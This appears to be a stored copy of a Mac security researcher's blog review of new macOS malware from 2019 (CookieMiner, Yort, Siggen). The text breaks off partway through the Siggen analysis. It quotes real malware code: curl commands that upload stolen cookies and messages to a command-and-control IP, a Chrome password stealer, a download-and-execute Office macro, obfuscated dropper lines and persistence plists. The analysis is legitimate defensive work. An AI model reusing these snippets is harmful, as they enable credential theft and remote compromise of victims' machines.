{
    "id": "b8fc9b46-1bc0-40dc-a6ec-4816a804d18a",
    "created_at": "2023-01-12T15:01:49.614112Z",
    "updated_at": "2025-03-27T02:17:23.228984Z",
    "deleted_at": null,
    "sha1_hash": "0ec5dc66682ed4a3c9d0b11aec47f90e4441147b",
    "title": "2020-01-01 - The Mac Malware of 2019",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:07Z",
    "file_modification_date": "2022-05-29T01:23:07Z",
    "file_size": 10125258,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x53.html**\n\nThe Mac Malware of 2019 üëæ\n\na comprehensive analysis of the year's new malware\n\nby: Patrick Wardle / January 1, 2020\n\nOur research, tools, and writing, are supported by the \"Friends of Objective-See\" such as:\n\n[CleanMy Mac X](https://macpaw.com/cleanmymac)\n\nMalwarebytes\nAiro AV\n\n[Become a Friend!](https://objective-see.com/friends.html)\nüìù üëæ Want to play along?\n[All samples covered in this post are available in our malware collection. \\](https://objective-see.com/malware.html)\n\n‚Ä¶just make sure not to infect yourself!\n\n## üñ® Printable\n\nA printable (PDF) version of this report can be downloaded here:\n\n[The Mac Malware of 2019.pdf](../downloads/MacMalware_2019.pdf) \\\n\n## ‚åõ Background\n\nGoodbye, 2019! and hello 2020 ‚Ä¶a new decade! ü•≥\n\nFor the fourth year in a row, I‚Äôve decided to put together a blog post that comprehensively covers all the new\nMac malware that appeared during the course of the year. While the specimens may have been briefly reported\non before (i.e. by the AV company that discovered them), this blog aims to cumulatively and comprehensively\ncover all the new Mac malware of 2019 - in one place ‚Ä¶yes, with samples of each malware for download!\n\nIn this blog post, we're focusing on new Mac malware specimens or new variants that appeared in 2019.\nAdware and/or malware from previous years, are not covered.\nHowever at the end of this blog, I‚Äôve included a brief section dedicated to these other threats, that includes links\nto detailed write-ups.\n\nFor each malicious specimen covered in this post, we‚Äôll identify the malware‚Äôs:\n\nInfection Vector\n\n‚Ä¶how it was able to infect macOS systems.\n\n\n-----\n\nPersistence Mechanism\n‚Ä¶how it installed itself, to ensure it would be automatically restarted on reboot/user login.\n\nFeatures & Goals\n‚Ä¶what was the purpose of the malware? a backdoor? a cryptocurrency miner? etc.\n\nAlso, for each malware specimen, I‚Äôve added a direct download link, in case you want to follow along with our\nanalysis or dig into the malware more!\n\nI‚Äôd personally like to thank the following organizations, groups, and researchers for their work, analysis, &\nassistance! ÔøΩ\n\n[VirusTotal.](https://www.virustotal.com/)\n\n[The ‚Äú malwareland ‚Äù channel on the MacAdmins slack group.](https://macadmins.slack.com/)\n\n[@thomasareed /](https://twitter.com/thomasareed) [@morpheus______ /](https://twitter.com/Morpheus______) [@philofishal / and others who choose to remain unnamed.](https://twitter.com/philofishal)\n\n\\\n\n## üõ† Malware Analysis Tools & Tactics\n\nThroughout this blog, we‚Äôll reference various tools used in analyzing the malware specimens.\n\nThese include:\n```\n   ProcessMonitor\n\n```\n[Our user-mode (open-source) utility that monitors process creations and terminations, providing detailed](https://github.com/objective-see/ProcessMonitor)\ninformation about such events.\n```\n   FileMonitor\n\n```\n[Our user-mode (open-source) utility monitors file events (such as creation, modifications, and deletions)](https://github.com/objective-see/FileMonitor)\nproviding detailed information about such events.\n```\n   WhatsYourSign\n\n```\n[Our (open-source) utility that displays code-signing information, via the UI.](https://github.com/objective-see/WhatsYourSign)\n```\n   lldb\n\n```\nThe de-facto commandline debugger for macOS. Installed (to `/usr/bin/lldb ) as part of Xcode.`\n```\n   Hopper Disassembler\n\n```\nA ‚Äúreverse engineering tool (for macOS) that lets you disassemble, decompile and debug your\napplications‚Äù ‚Ä¶or malware specimens!\n\nIf you‚Äôre interested in general Mac malware analysis techniques, check out the following resources:\n\n[‚ÄúLets Play Doctor: Practical OSX Malware Detection & Analysis‚Äù](https://speakerdeck.com/patrickwardle/shakacon-2016-lets-play-doctor-practical-os-x-malware-detection-and-analysis)\n\n[‚ÄúHow to Reverse Malware on macOS Without Getting Infected‚Äù](https://www.sentinelone.com/blog/reversing-macos-malware-ebook-intro-by-patrick-wardle/)\n\n\\\n\n## üóì Timeline\n\n\n-----\n\nCookieMiner\n\n```\n01/2019\n\n```\n\nA cryptominer that also steals user cookies and passwords, likely to give attackers access to victims\nonline accounts and wallets.\n\nYort\n\n```\n03/2019\n\n```\n\nA Lazarus group backdoor, targeting cryptocurrency businesses.\n\n**Siggen**\n\n```\n04/2019\n\n```\n\nA macOS backdoor that downloads and executes (python) payloads.\n\n**BirdMiner**\n\n```\n06/2019\n\n```\n\nA linux-based cryptominer, that runs on macOS via QEMU emulation.\n\n**Netwire**\n\n```\n06/2019\n\n```\n\nA fully-featured macOS backdoor, installed via a Firefox 0day.\n\n**Mokes.B**\n\n```\n06/2019\n\n```\n\nA new variant of `OSX.Mokes, a fully-featured macOS backdoor.`\n\n**GMERA**\n\n```\n09/2019\n\n```\n\nA Lazarus group trojan that persistently exposes a shell to remote attackers.\n\n**Lazarus (unnamed)**\n\n```\n10/2019\n\n```\n\nAn (unnamed) Lazarus group backdoor.\n\n\n-----\n\n**Yort.B**\n\n```\n11/2019\n\n```\n\nA new variant of `Yort, a Lazarus group backdoor, targeting cryptocurrency businesses.`\n\n**Lazarus Loader (\"macloader\")**\n\n```\n12/2019\n\n```\n\nA Lazarus group 1 -stage implant loader that is able to executed remote payloads, directly from memory.st\n\n\\\n\n## üëæ OSX.CookieMiner\n\nCookieMiner is a cryptominer that also steals user cookies and passwords, likely to give attackers access to\nvictims online accounts and wallets.\n\n[Download: OSX.CookieMiner (password:](https://objective-see.com/downloads/malware/CookieMiner.zip) `infect3d )`\n\nWriteups:\n\nInfection Vector: Unknown\n\nUnit 42 (of Palo Alto Networks) who uncovered `CookieMiner and wrote the original report on the malware,`\nmade no mention the malware‚Äôs initial infection vector.\n\nHowever, a ThreatPost [writeup states that:](https://threatpost.com/mac-cookieminer-malware-crypto/141334/)\n\n\"[Jen Miller-Osborn](https://twitter.com/jadefh), deputy director of Threat Intelligence for Unit 42, told\nThreatpost that researchers are not certain how victims are first infected by the shell script, but they\nsuspect victims download a malicious program from a third-party store.\"\n\n‚Ä¶as such, `CookieMiner ‚Äôs infection vector remains unknown. \\`\n\nPersistence: Launch Agent\n\n\n-----\n\nAs noted in Unit 42 s [report](https://unit42.paloaltonetworks.com/mac malware steals cryptocurrency\nexchanges-cookies/), `CookieMiner` persists two launch agents. This is performed during the first stage of the\ninfection, via a shell script named `uploadminer.sh`:\n```\n1...\n2\n3cd ~/Library/LaunchAgents\n4curl -o com.apple.rig2.plist http://46.226.108.171/com.apple.rig2.plist\n5curl -o com.proxy.initialize.plist http://46.226.108.171/com.proxy.initialize.plist\n6launchctl load -w com.apple.rig2.plist\n7launchctl load -w com.proxy.initialize.plist\n\n```\nThe script, `uploadminer.sh, downloads (via` `curl ), two property lists into the` `~/Library/LaunchAgents`\ndirectory.\n\nThe first plist, `com.apple.rig2.plist, persists a binary named` `xmrig2 along with several commandline`\narguments:\n```\n 1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3<plist version=\"1.0\">\n 4<dict>\n 5 <key>ProgramArguments</key>\n 6 <array>\n 7  <string>/Users/Shared/xmrig2</string>\n 8  <string>-a</string>\n 9  <string>yescrypt</string>\n10  <string>-o</string>\n11  <string>stratum+tcp://koto-pool.work:3032</string>\n12  <string>-u</string>\n13  <string>k1GqvkK7QYEfMj3JPHieBo1m...</string>\n14 </array>\n15 <key>RunAtLoad</key>\n16 <true/>\n17 <key>Label</key>\n18 <string>com.apple.rig2.plist</string>\n19</dict>\n20</plist>\n\n```\nAs the `RunAtLoad key is set to` `true in the launch agent property list, the` `xmrig2 binary will be`\nautomatically launched each time the user (re)logs in.\n\nThe second plist, `com.proxy.initialize.plist, persists various inline python commands (that appear to`\nexecute a base64 encoded chunk of data):\n\n\n-----\n\n```\n                 g\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ... >\n 3<plist version=\"1.0\">\n 4<dict>\n 5<key>Label</key>\n 6<string>com.proxy.initialize.plist</string>\n 7<key>ProgramArguments</key>\n 8<array>\n 9<string>python</string>\n10<string>-c</string>\n11<string>import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode(\n12  'aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml\n13  ...\n14  hcileU1soU1tpXStTW2pdKSUyNTZdKSkKZXhlYygnJy5qb2luKG91dCkp'));\n15</string>\n16</array>\n17<key>RunAtLoad</key>\n18<true/>\n19</dict>\n20</plist>\n\n```\nAs the `RunAtLoad key is set to` `true in this property list as well, the python commands will be automatically`\n(re)executed each time the user logs in.\n\nDoes this look familiar? Yes! In fact this is exactly how `OSX.DarthMiner persisted. (We also covered`\n\n`OSX.DarthMiner in our` [‚ÄúThe Mac Malware of 2018‚Äù report).](https://objective-see.com/blog/blog_0x3C.html#DarthMiner)\n\n[This is not a coincidence, as (was noted in the Unit 42 report): ‚Äú[ CookieMiner ] has been developed from](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)\n```\nOSX.DarthMiner, a malware known to target the Mac platform‚Äù\n\n```\nCapabilities: Cryptomining, Cookie/Password Stealing, Backdoor\n```\nCookieMiner is likely the evolution of OSX.DarthMiner.\n\n```\nIn our [‚ÄúThe Mac Malware of 2018‚Äù report we noted that](https://objective-see.com/blog/blog_0x3C.html#DarthMiner) `DarthMiner, persists the well known Empyre`\nbackdoor (via the `com.proxy.initialize.plist file) and a cryptocurrency mining binary named` `XMRig`\n(via `com.apple.rig.plist ).`\n```\nCookieMiner does this as well (though a 2 has been added to both the mining binary and plist):\n   XMRig -> xmrig2\n   com.apple.rig.plist -> com.apple.rig2.plist\n\n```\n[The persistently installed Empyre backdoor allows remote attacks to run arbitrary commands on an infected](https://github.com/EmpireProject/EmPyre)\nhost.\n\nBy examining the arguments passed to the persistent miner binary, `xmrig2 it appears to be mining the Koto`\ncryptocurrency:\n```\n 1<key>ProgramArguments</key>\n 2<array>\n 3 <string>/Users/Shared/xmrig2</string>\n 4 <string>-a</string>\n 5 <string>yescrypt</string>\n 6 <string>-o</string>\n 7 <string>stratum+tcp://koto-pool.work:3032</string>\n 8 <string>-u</string>\n 9 <string>k1GqvkK7QYEfMj3JPHieBo1m...</string>\n10</array>\n\n```\n\n-----\n\nThe most interesting aspect of `CookieMiner (and what differentiates it from` `OSX.DarthMiner ) is its`\n[propensity for stealing! During their comprehensive analysis Unit 42 researchers highlighted the fact that](https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/)\n```\nCookieMiner captures and exfiltrates the following:\n\n```\n(Browser) Cookies\n(Browser) Passwords\niPhones messages (from iTunes backups)\n\nThe cookie, password, and message stealing capabilities are (likely) implemented to allow attackers to bypass\n2FA protections on victims online cryptocurrency accounts:\n\n\"_By leveraging the combination of stolen login credentials, web cookies, and SMS data, based on past\nattacks like this, we believe the bad actors could bypass multi-factor authentication for these\n\n[cryptocurrency] sites. \\ \\ If successful, the attackers would have full access to the victim's exchange\naccount and/or wallet and be able to use those funds as if they were the user themselves._\" -Unit 42\n\nThe methods to steal such information, are not (overly) sophisticated, albeit sufficient.\n\nFor example, to steal cookies from Safari, `CookieMiner simply copies the` `Cookies.binarycookies file`\nfrom the `~/Library/Cookies directory, zips them up, and exfiltrates them to the attacker‚Äôs remote command`\n& control server ( 46.226.108.171 ):\n```\n1cd ~/Library/Cookies\n2if grep -q \"coinbase\" \"Cookies.binarycookies\"; then\n3mkdir ${OUTPUT}\n4cp Cookies.binarycookies ${OUTPUT}/Cookies.binarycookies\n5zip -r interestingsafaricookies.zip ${OUTPUT}\n6curl --upload-file interestingsafaricookies.zip http://46.226.108.171:8000\n\n```\nNote though, the cookie file ( Cookies.binarycookies ) is only stolen if it contains cookies that are associated\nwith cryptocurrency exchanges (such as Coinbase & Binance).\n\nThe malware also extracts saved passwords and credit card information from Google Chrome, via a python\nscript:\n\n\"_`CookieMiner` downloads a Python script named \"`harmlesslittlecode.py`\" to extract saved login\ncredentials and credit card information from Chrome's local data storage._\" -Unit 42\n```\n1curl -o harmlesslittlecode.py http://46.226.108.171/harmlesslittlecode.py\n2python harmlesslittlecode.py > passwords.txt 2>&1\n 1if __name__ == '__main__':\n 2  root_path = \"/Users/*/Library/Application Support/Google/Chrome\"\n 3  login_data_path = \"{}/*/Login Data\".format(root_path)\n 4  cc_data_path = \"{}/*/Web Data\".format(root_path)\n 5  chrome_data = glob.glob(login_data_path) + glob.glob(cc_data_path)\n 6  safe_storage_key = subprocess.Popen(\n 7    \"security find-generic-password -wa \"\n 8    \"'Chrome'\",\n 9    stdout=subprocess.PIPE,\n10    stderr=subprocess.PIPE,\n11    shell=True)\n12  stdout, stderr = safe_storage_key.communicate()\n13  ...\n14  chrome(chrome_data, safe_storage_key)\n\n```\nFinally, `CookieMiner attempts to locate and exfiltrate iPhone message files from any mobile backups (within`\n```\nMobileSync/Backup ):\n\n```\n\n-----\n\n```\n        y pp pp y p\n 2BACKUPFOLDER=\"$(ls)\"\n 3cd ${BACKUPFOLDER}\n 4SMSFILE=\"$(find . -name '3d0d7e5fb2ce288813306e4d4636395e047a3d28')\"\n 5cp ${SMSFILE} ~/Library/Application\\ Support/Google/Chrome/Default/${OUTPUT}\n 6\n 7...\n 8cd ~/Library/Application\\ Support/Google/Chrome/Default/\n 9zip -r ${OUTPUT}.zip ${OUTPUT}\n10curl --upload-file ${OUTPUT}.zip http://46.226.108.171:8000\n\n```\nArmed browser cookies, passwords, and even iPhone messages, the attacker may be able to access (and thus\npotentially drain) victims‚Äô cryptocurrency accounts, even if 2FA is deployed! üç™üò±\n\n\\\n\n## üëæ OSX.Yort\n\nYort is a Lazarus group (1 -stage?) implant, targeting cryptocurrency businesses.st\n\n[Download: OSX.Yort (password:](https://objective-see.com/downloads/malware/Yort.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúCryptocurrency Businesses Still Being Targeted By Lazarus‚Äù](https://securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus/90019/)\n\n[‚ÄúLazarus Apt Targets Mac Users With Poisoned Word Document‚Äù](https://www.sentinelone.com/blog/lazarus-apt-targets-mac-users-poisoned-word-document/)\n\n[‚ÄúA Look into the Lazarus Group‚Äôs Operations in October 2019‚Äù](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/23-10-19/analysis.md#OSX)\n\n\\\n\nInfection Vector: Malicious Office Documents\n\nThe SecureList [report which details the attack and](https://securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus/90019/) `Yort malware, states that:`\n\n\"The malware was distributed via documents carefully prepared to attract the attention of cryptocurrency\nprofessionals.\" -SecureList\n\nAnalyzing the one of the malicious files ( ÏÉòÌîå_Í∏∞Ïà†ÏÇ¨ÏóÖÍ≥ÑÌöçÏÑú(Î≤§Ï≤òÍ∏∞ÏóÖÌèâÍ∞ÄÏö©).doc ), we find embedded Macspecific macro code:\n\n\n-----\n\n```\n 2  #If VBA7 Then\n 3\n 4  Private Declare PtrSafe Function system Lib \"libc.dylib\" \n 5   (ByVal command As String) ...\n 6  \n 7  Private Declare PtrSafe Function popen Lib \"libc.dylib\" \n 8   (ByVal command As String, ByVal mode As String) As LongPtr\n 9\n10  #Else\n11\n12  Private Declare Function system Lib \"libc.dylib\" \n13   (ByVal command As String) As Long\n14  Private Declare Function popen Lib \"libc.dylib\" \n15   (ByVal command As String, ByVal mode As String) As Long\n16\n17  #End If\n18#End If\n19\n20Sub AutoOpen()\n21On Error Resume Next\n22#If Mac Then\n23\n24 sur = \"https://nzssdm.com/assets/mt.dat\"\n25 spath = \"/tmp/\": i = 0\n26 Do\n27  spath = spath & Chr(Int(Rnd * 26) + 97): i = i + 1\n28 Loop Until i > 12\n29 \n30 spath = spath\n31\n32 res = system(\"curl -o \" & spath & \" \" & sur)\n33 res = system(\"chmod +x \" & spath)\n34 res = popen(spath, \"r\")\n35\n36 ...\n\n```\nIf a Mac user opens the document in Microsoft Office and enables macros, these malicious macros will be\nautomatically executed (triggered via the `AutoOpen() ) function.`\n\nThe macro logic:\n\ndownloads a file from `https://nzssdm.com/assets/mt.dat (via` `curl ) to the` `/tmp/ directory`\nsets its permissions to executable (via `chmod +x )`\nexecutes the (now executable) downloaded file, `mt.dat (via` `popen )`\n\n[For more details on the malicious macros in this attack, see @philofishal‚Äôs writeup:](https://twitter.com/philofishal)\n\n[\"Lazarus Apt Targets Mac Users With Poisoned Word Document\"](https://www.sentinelone.com/blog/lazarusapt-targets-mac-users-poisoned-word-document/)\n\nPersistence: None\n\nIt does not appear that (this variant) of `OSX.Yort persists itself. However, as a light-weight 1 -stage implant,st`\npersistence may not be needed, as a noted in an analysis titled, ‚ÄúA Look into the Lazarus Group‚Äôs Operations in\nOctober 2019‚Äù:\n\n\"The malware doesn't have a persistence, but by the fact that [it] can execute [any] command, the\nattacker can decide push a persistence if this necessary\"\n\n\n-----\n\nCapabilities: 1 -stage implant, with standard backdoor capabilities.st\n```\nYort (likely a 1 -stage implant), supports a variety of ‚Äòstandard‚Äô commands, such as file download, upload,st\n\n```\nand the execution of arbitrary commands.\n\nUsing macOS‚Äôs built-in `file utility, shows that` `mt.dat is a standard 64-bit macOS (Mach-O) executable.`\n```\n$ file Yort/A/mt.dat \nYort/A/mt.dat: Mach-O 64-bit executable x86_64\n\n```\nThe `strings command (executed with the` `-a flag) can dump (ASCII) strings, that are embedded in the`\nbinary. In `OSX.Yort ‚Äôs case these strings are rather revealing:`\n```\n$ strings -a Yort/A/mt.dat \ncache-control: no-cache\ncontent-type: multipart/form-data\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100\nSafari/537.36\nfile\n/bin/bash -c \"\n\" > \n/tmp/\n 2>&1\nhttps://towingoperations.com/chat/chat.php\nhttps://baseballcharlemagnelegardeur.com/wp-content/languages/common.php\nhttps://www.tangowithcolette.com/pages/common.php\n\n```\nIt is easy to confirm that the embedded URLs are malware‚Äôs actual command and control servers, as when\nexecuted (in a VM), the malware attempts to connect out to (one of) these addresses for tasking:\n```\n$ ./mt.dat \n* Trying 69.195.124.206...\n* Connected to baseballcharlemagnelegardeur.com (69.195.124.206) port 443 (#0)\n* SSL certificate problem: certificate has expired\n* stopped the pause stream!\n* Closing connection 0\n\n```\nAnother static analysis tool, `nm can dump embedded symbols (such as method names, and imported (system)`\nfunctions):\n\n\n-----\n\n```\n$\n... \n00000001000010f0 T _MainLoop\n0000000100001810 T _RecvBlockData\n00000001000019d0 T _RecvBlockDataUncrypt\n00000001000018f0 T _RecvBlockDataWithLimit\n0000000100001a40 T _RecvBlockDataWithLimitUncrypt\n0000000100002460 T _ReplyCmd\n0000000100002360 T _ReplyDie\n00000001000033c0 T _ReplyDown\n0000000100003e20 T _ReplyExec\n0000000100004180 T _ReplyGetConfig\n0000000100002150 T _ReplyKeepAlive\n0000000100002c20 T _ReplyOtherShellCmd\n0000000100003fd0 T _ReplySessionExec\n0000000100004410 T _ReplySetConfig\n0000000100002240 T _ReplySleep\n0000000100001f50 T _ReplyTroyInfo\n0000000100003900 T _ReplyUpload\n         U _curl_easy_cleanup\n         U _curl_easy_init\n         U _curl_easy_perform\n         U _curl_easy_setopt\n         U _curl_formadd\n         U _curl_formfree\n         U _curl_global_cleanup\n         U _curl_global_init\n         U _curl_slist_append\n         U _curl_slist_free_all\n         U _fork\n         U _fwrite\n         U _kill\n         U _unlink\n         U _waitpid\n\n```\nFrom this output, it seems reasonable to assume that the malware supports a variety of commands that are\nfairly common in first-stage implants and/or lightweight backdoors.\n```\n   ReplyCmd : execute commands?\n   ReplyDie : kill implant?\n   ReplyOtherShellCmd : execute shell command?\n   ReplyDown : download a file?\n   ReplyUpload : upload a file?\n\n```\netc‚Ä¶\n\nAnd references to the `curl_* APIs likely indicate that the malware implements its networking logic via`\n```\nlibcurl .\n\n```\nDebugging the malware (via `lldb ) confirms that indeed the malware is leveraging` `libcurl . Here for`\nexample we see the malware setting the url of its command and control server\n( baseballcharlemagnelegardeur.com ) via the `curl_easy_setopt function with the` `CURLOPT_URL`\n( 10002 ) parameter:\n\n\n-----\n\n```\n$\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1\n frame #0: 0x00007fff7d446b9b libcurl.4.dylib`curl_easy_setopt\n(lldb) p $rsi\n(unsigned long) $1 = 10002\n(lldb) x/s $rdx\n0x1000052a8: \"https://baseballcharlemagnelegardeur.com/wp-content/languages/common.php\"\n\n```\nThe malware then connects to the specified server, via the `curl_easy_perform function.`\n\nIf the malware receives a response (tasking) from the command and control server, it will act upon said\nresponse (via switch statement, or `jumptable ). The logic that implements delegation of the received`\ncommands is found at address `0x0000000100004679 within the malware‚Äôs binary:`\n```\n1cmp   eax, 17h    ; switch 24 cases\n2ja   loc_100004A6D  ; jumptable 0000000100004693 default case\n3lea   rcx, off_100004B60\n4movsxd rax, dword ptr [rcx+rax*4]\n5add   rax, rcx\n6mov   rbx, r15\n7jmp   rax       ; switch jump\n\n```\nFor example for case #19, the malware will execute the `ReplyDown command:`\n```\n1mov   ecx, 801h    ; jumptable 0000000100004693 case 19\n2mov   rdi, rsp\n3lea   rsi, [rbp-85A8h]\n4rep movsq\n5mov   eax, [rbp-45A0h]\n6mov   [rsp+4008h], eax\n7call  _ReplyDown\n\n```\nDigging into the disassembly of the `ReplyDown command, shows that the malware will invoke functions such`\nas:\n```\n   fopen with the rb (‚Äúread binary‚Äù) parameter\n   fread\n   fclose\n\n```\nThis (brief) static analysis indicates this method will download a file, from the infected machine to the server.\n\nAnother example is #case 22, which calls into the `ReplyExec function.`\n```\n1mov   ecx, 801h    ; jumptable 0000000100004693 case 22\n2mov   rdi, rsp\n3lea   rsi, [rbp-85A8h]\n4rep movsq\n5mov   eax, [rbp-45A0h]\n6mov   [rsp+4008h], eax\n7call  _ReplyExec\n\n```\nThe `ReplyExec function, as its names implies, will executed perhaps a command or file uploaded to the client`\nfrom the server:\n\n\n-----\n\n```\n    _ p y ( g, g, ) {\n 2\n 3 ...\n 4\n 5 rax = fork();\n 6 if (rax == 0x0)\n 7 {\n 8   system(&var_4580);\n 9   rax = exit(0x0);\n10   return rax;\n11 }\n\n```\nSimilar analysis of the other `Reply* commands confirm their rather descriptive names, match their logic.`\n\nFor more details on the capabilities of mt.data, see:\n\n[\"A Look into the Lazarus Group's Operations in October 2019\"]\n(https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/North%20Korea/APT/Lazarus/23-1019/analysis.md#OSX)\n\n\\\n\n## üëæ OSX.Siggen\n\nSiggen, packaged in a fake WhatsApp application, is a persistent backdoor that allows remote attackers to\ndownload and execute (python) payloads.\n\n[Download: OSX.Siggen (password:](https://objective-see.com/downloads/malware/Siggen.zip) `infect3d )`\n\nWriteups:\n\n[‚ÄúMac.BackDoor.Siggen.20‚Äù](https://vms.drweb.com/virus/?i=17783537)\n\n[‚ÄúmacOS Malware Outbreaks 2019 | The First 6 Months‚Äù](https://www.sentinelone.com/blog/macos-malware-2019-first-six-months/)\n\n\\\n\nInfection Vector: Trojaned (fake) WhatsApp Application\n\n‚ÄúPhishing AI‚Äù [@phishingai, stated the following in a tweet:](https://twitter.com/phishingai/)\n\n\"_This @WhatsApp #phishing/drive-by-download domain `message-whatsapp[.]com` \\ \\ ...is delivering\nmalware via an iframe. The iframe delivers a custom response depending on the device detected. Mac\nmalware is delivered via a zip file with an application inside._\"\n\n\n-----\n\nThis [@WhatsApp](https://twitter.com/WhatsApp?ref_src=twsrc%5Etfw) [#phishing/drive by download domain](https://twitter.com/hashtag/phishing?src=hash&ref_src=twsrc%5Etfw)\n\nmessage-whatsapp[.]com\n\n...is delivering malware via an iframe. The iframe delivers a custom response depending on the device\ndetected. Mac malware is delivered via a Zip file with an application inside.\n\ncc: [@Lookout](https://twitter.com/Lookout?ref_src=twsrc%5Etfw) [pic.twitter.com/c7A8mwp4iy](https://t.co/c7A8mwp4iy)\n\n[‚Äî Phishing AI (@PhishingAi) April 25, 2019](https://twitter.com/PhishingAi/status/1121409348184313856?ref_src=twsrc%5Etfw)\n\n[A screen capture from @phishingai‚Äôs tweet of the malicious](https://twitter.com/phishingai/) `message-whatsapp.com website, shows how`\nusers could be tricked into manually downloading and installing what they believe is the popular WhatsApp\nmessaging application: \\\n\nThe download is a zip archive named `WhatsAppWeb.zip ‚Ä¶that (surprise, surprise) is not WhatsApp, but`\nrather an application named `WhatsAppService \\`\n\n\n-----\n\nThe `WhatsAppService application:`\n\nis unsigned\nhas an PDF icon\nhas a main binary named `DropBox`\n\nWill users be tricked into running this? ‚Ä¶and manually work thru the Gatekeeper alerts (as the app is\nunsigned)? Apparently so! ÔøΩ \\\n\nPersistence: Launch Agent\n\nIf the user is tricked into downloading and running the `WhatsAppService application it will persistently install a`\nlaunch agent.\n\nThe `WhatsAppService was built using Platypus. This legitimate developer tool creates a standalone app, from`\na script:\n\n\"_Platypus is a developer tool that creates native Mac applications from command line scripts such as\nshell scripts or Python, Perl, Ruby, Tcl, JavaScript and PHP programs. This is done by wrapping the script\nin a macOS application bundle along with an app binary that runs the script._\" -sveinbjorn.org/platypus\n\nIt‚Äôs rather popular with (basic) Mac malware authors who are sufficient are creating malicious scripts, but want\nto distributer their malicious creations as native macOS applications.\n\n[For example both OSX.CreativeUpdate and](https://objective-see.com/blog/blog_0x29.html) `OSX.Eleanor utilized Platypus as well:`\n\n\n-----\n\nWhen a ‚Äúplatypus‚Äù applications is executed, it simple runs a file named `script from within the app‚Äôs`\n```\nResources directory.\n\n```\nTaking a peek at the `WhatsAppService.app/Resources/script file, we can see it persists a launch agent`\nnamed `a.plist :`\n```\n1//Resources/script\n2\n3echo c2NyZWVuIC1kbSBiYXNoIC1jICdzbGVlcCA1O2tpbGxhbGwgVGVybWluYWwn | base64 -D | sh\n4curl -s http://usb.mine.nu/a.plist -o ~/Library/LaunchAgents/a.plist\n5echo Y2htb2QgK3ggfi9MaWJyYXJ5L0xhdW5jaEFnZW50cy9hLnBsaXN0 | base64 -D | sh\n6launchctl load -w ~/Library/LaunchAgents/a.plist\n7curl -s http://usb.mine.nu/c.sh -o /Users/Shared/c.sh\n8echo Y2htb2QgK3ggL1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh\n9echo L1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh\n\n```\nSpecifically it executes the following: `curl -s http://usb.mine.nu/a.plist -o`\n```\n~/Library/LaunchAgents/a.plist\n\n```\nThe a.plist (that is downloaded from http://usb.mine.nu/ ) executes the /Users/Shared/c.sh file:\n\n\n-----\n\n```\n                 g\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3<plist version=\"1.0\">\n 4 <dict>\n 5  <key>EnvironmentVariables</key>\n 6  <dict>\n 7   <key>PATH</key>\n 8   <string>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:</string>\n 9  </dict>\n10    <key>KeepAlive</key>\n11  <true/>\n12  <key>Label</key>\n13  <string>com.enzo</string>\n14  <key>Program</key>\n15  <string>/Users/Shared/c.sh</string>\n16  <key>RunAtLoad</key>\n17  <true/>\n18 </dict>\n19</plist>\n\n```\nThe `c.sh file is (also) downloaded via the` `WhatsAppService.app/Resources/script :` `curl -s`\n```\nhttp://usb.mine.nu/c.sh -o /Users/Shared/c.sh\n\n```\nAs the `RunAtLoad key is set to` `true in the` `a.plist every time the user logs in,` `c.sh will be`\nautomatically (re)executed.\n\nCapabilities: Persistent Backdoor (download & execute (python) payloads).\n\nRecall the `WhatsAppService.app/Resources/script is ran when the user launches`\n```\nWhatsAppService.app . Let‚Äôs break down each line of this script:\n\n```\n1. `echo c2NyZWVuIC1kbSBiYXNoIC1jICdzbGVlcCA1O2tpbGxhbGwgVGVybWluYWwn | base64 -D | sh`\n\nDecodes and executes `screen -dm bash -c 'sleep 5;killall Terminal' which effectively kills any`\nrunning instances of `Terminal.app`\n\\\n2. `curl -s http://usb.mine.nu/a.plist -o ~/Library/LaunchAgents/a.plist`\n\nAs noted, downloads and persists `a.plist as a launch agent.`\n\\\n3. `echo Y2htb2QgK3ggfi9MaWJyYXJ5L0xhdW5jaEFnZW50cy9hLnBsaXN0 | base64 -D | sh`\n\nDecodes and executes `chmod +x ~/Library/LaunchAgents/a.plist which (unnecessarily) sets`\n```\n   a.plist to be executable.\n\n```\n\\\n4. `launchctl load -w ~/Library/LaunchAgents/a.plist`\n\nLoads `a.plist which attempts to executes` `/Users/Shared/c.sh . However, (the first time this is run),`\n```\n   /Users/Shared/c.sh has yet to be downloaded‚Ä¶\n\n```\n\\\n5. `curl -s http://usb.mine.nu/c.sh -o /Users/Shared/c.sh`\n\nDownloads `c.sh to` `/Users/Shared/c.sh`\n\\\n6. `echo Y2htb2QgK3ggL1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh`\n\nDecodes and executes `chmod +x /Users/Shared/c.sh which sets` `c.sh to be executable`\n\\\n7. `echo L1VzZXJzL1NoYXJlZC9jLnNo | base64 -D | sh`\n\nDecodes and executes `/Users/Shared/c.sh`\n\n\n-----\n\nAnd what does `/Users/Shared/c.sh do?`\n```\n 1//Users/Shared/c.sh\n 2\n 3#!/bin/bash\n 4v=$( curl --silent http://usb.mine.nu/p.php | grep -ic 'open' )\n 5p=$( launchctl list | grep -ic \"HEYgiNb\" )\n 6if [ $v -gt 0 ]; then\n 7if [ ! $p -gt 0 ]; then\n 8echo 